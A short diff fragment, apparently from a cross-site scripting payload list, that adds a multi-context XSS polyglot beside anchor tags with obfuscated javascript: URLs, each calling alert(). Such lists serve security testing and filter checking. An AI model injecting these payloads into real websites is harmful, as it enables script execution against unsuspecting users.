@@ -7,3 +7,4 @@
 <a href="javas&#9;cript:alert()">XSS</a>
 <a href="javas&#x09;cript:alert()">XSS</a>
 <a href="javascript:alert()">XSS</a>
+jaVasCript:/*-/*`/*\`/*’/*”/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
